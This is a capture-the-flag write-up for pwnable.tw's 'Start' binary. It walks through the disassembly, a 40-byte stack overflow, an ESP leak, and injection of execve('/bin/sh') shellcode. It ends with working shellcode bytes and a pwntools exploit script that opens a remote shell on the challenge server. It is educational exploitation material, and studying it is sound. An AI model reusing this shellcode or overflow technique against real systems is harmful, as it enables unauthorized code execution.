---
tags:
  - Pwnables
  - BinaryExploitation
  - Shellcode-Injection
---
# Start

## Challenge Overview

32-bit ELF, no libc, no standard entry point. Just raw syscalls in `_start`. Zero mitigations across the board.

```bash
pwndbg> checksec
File:     /home/at0m/start/start
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Only two meaningful symbols exist:
## Binary Analysis

### Defined Functions

```bash
0x08048060  _start
0x0804809d  _exit
```

No libc, no `main`, no PLT/GOT.
## Disassembly Breakdown

### Part 1 - Save ESP and set return address

```asm
0x08048060 <+0>:    push   esp
0x08048061 <+1>:    push   0x804809d
```

`push esp` saves the current value of ESP onto the stack before anything else moves it. This is the key to the leak later. The saved value represents the stack pointer at program entry.

`push 0x804809d` pushes the address of `_exit` as the intended return address. When `ret` fires at the end, it is supposed to jump here and exit cleanly.

Stack after these two instructions:

```
[ top of stack ] 0x0804809d  <- _exit (intended ret addr)
[    below     ] original ESP value
```
### Part 2 - Zero out registers

```asm
0x08048066 <+6>:    xor    eax, eax
0x08048068 <+8>:    xor    ebx, ebx
0x0804806a <+10>:   xor    ecx, ecx
0x0804806c <+12>:   xor    edx, edx
```

Clears eax, ebx, ecx, edx to zero. Standard way to zero a register without a `mov reg, 0` (smaller encoding). Done before setting up syscall arguments so there is no garbage left over from program startup.
### Part 3 - Push the string onto the stack

```asm
0x0804806e <+14>:   push   0x3a465443
0x08048073 <+19>:   push   0x20656874
0x08048078 <+24>:   push   0x20747261
0x0804807d <+29>:   push   0x74732073
0x08048082 <+34>:   push   0x2774654c
```

Five 4-byte pushes, 20 bytes total. The stack grows downward so they are pushed in reverse order. Reading them from low to high address once all five are on the stack:

```
0x2774654c  ->  "Let'"
0x74732073  ->  "s st"
0x20747261  ->  "art "
0x20656874  ->  " the"
0x3a465443  ->  "CTF:"
```

Combined: `"Let's start the CTF: "` (20 bytes including the trailing space)

x86 is little-endian so each dword is stored with its lowest byte at the lowest address, which is why the bytes come out in the right order when read as a string.
### Part 4 - sys_write (print the string)

```asm
0x08048087 <+39>:   mov    ecx, esp
0x08048089 <+41>:   mov    dl, 0x14
0x0804808b <+43>:   mov    bl, 0x1
0x0804808d <+45>:   mov    al, 0x4
0x0804808f <+47>:   int    0x80
```

`mov ecx, esp` sets ecx to the current stack pointer, which is now pointing at the bottom of the string we just pushed. This is the buffer pointer for `write`.

Setting up the `sys_write` syscall (int 0x80 ABI on i386):

|register|value|meaning|
|---|---|---|
|eax|0x4|syscall number for sys_write|
|ebx|0x1|fd = stdout|
|ecx|esp|pointer to the string on the stack|
|edx|0x14 (20)|number of bytes to write|

`int 0x80` triggers the syscall. Prints `"Let's start the CTF: "` to stdout.

Note: `ecx = esp` at this point means the write buffer starts at the bottom of the string. But just above the string in memory (higher address) sits the saved original ESP that was pushed at entry. When we re-trigger this write later via our overflow, those extra bytes come out in the output and reveal the leak.
### Part 5 - sys_read (read user input)

```asm
0x08048091 <+49>:   xor    ebx, ebx
0x08048093 <+51>:   mov    dl, 0x3c
0x08048095 <+53>:   mov    al, 0x3
0x08048097 <+55>:   int    0x80
```

`xor ebx, ebx` zeroes ebx, setting fd = 0 (stdin).

Setting up `sys_read` (int 0x80 ABI):

|register|value|meaning|
|---|---|---|
|eax|0x3|syscall number for sys_read|
|ebx|0x0|fd = stdin|
|ecx|esp (unchanged)|same buffer pointer as the write|
|edx|0x3c (60)|number of bytes to read|

`int 0x80` triggers the read. Reads up to 60 bytes from stdin into the same stack region the string was sitting in.

The buffer is 20 bytes (the string region). The read accepts 60. That is a 40-byte overflow.
### Part 6 - Stack cleanup and return

```asm
0x08048099 <+57>:   add    esp, 0x14
0x0804809c <+60>:   ret
```

`add esp, 0x14` moves ESP up by 20 (0x14) bytes, discarding the string region from the stack. ESP now points at what is supposed to be the `_exit` address pushed at the start.

`ret` pops that value and jumps to it.

If we overflowed the buffer and wrote a different address at offset 20, `ret` jumps there instead. That is the control flow hijack.
## Vulnerability

`sys_read` reads 60 bytes into a 20-byte region. We control bytes 0-59. The return address sits at offset 20. Write anything there and we redirect execution.

The `push esp` at entry is what enables the leak. That saved ESP value ends up just above the string in memory. When we re-trigger the `sys_write` by returning back to `+39`, the output contains those bytes including the original ESP. Now we have a real stack address to work with.
## Exploit Plan
### Stage 1 - Leak ESP

Send 20 bytes of padding + `p32(0x08048087)` as the return address. `0x08048087` is the `mov ecx, esp` instruction, right before the write syscall. This re-runs the print, and the 4 bytes we receive back contain the saved original ESP.
### Stage 2 - Get Shell

With the leaked ESP, calculate where shellcode lands. The payload is laid out like this:

```c
offset 0x00: 20 bytes padding     <- fills the buffer
offset 0x14: p32(target_addr)     <- ret addr, points to shellcode
offset 0x18: shellcode            <- execve("/bin/sh") starts here
```

`leaked_esp` points to the start of the buffer on the second read. Adding `0x14` (20 bytes) skips past the padding, then the 4-byte ret addr sits there, and shellcode starts right after at `+0x18`.

```c
target_addr = leaked_esp + 0x14
```

shellcode goes after the ret addr, not before it.
## Exploit

We need shellcode:

```c
\x31\xc0                  xor eax, eax        ; eax = 0 (null terminator later)
\x50                      push eax             ; push 0 onto stack (null terminate the string)
\x68\x2f\x2f\x73\x68      push 0x68732f2f      ; push "//sh" (little-endian)
\x68\x2f\x62\x69\x6e      push 0x6e69622f      ; push "/bin" (little-endian)
\x89\xe3                  mov ebx, esp         ; ebx = pointer to "/bin//sh\0"
\x89\xc1                  mov ecx, eax         ; ecx = 0 (argv = NULL)
\x89\xc2                  mov edx, eax         ; edx = 0 (envp = NULL)
\xb0\x0b                  mov al, 0x0b         ; eax = 11 = sys_execve
\xcd\x80                  int 0x80             ; execve("/bin//sh", NULL, NULL)
```
```python
from pwn import *

context.arch = 'i386'
context.os   = 'linux'

p = remote('chall.pwnable.tw', 10000)

p.recvuntil(b'CTF:')

payload  = b'A' * 20
payload += p32(0x08048087)
p.send(payload)

leaked_esp = u32(p.recv(4))
log.info(f'leaked esp: {hex(leaked_esp)}')

shellcode   = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
target_addr = leaked_esp + 0x14

payload2  = b'A' * 20
payload2 += p32(target_addr)
payload2 += shellcode
p.send(payload2)

p.interactive()
```

---
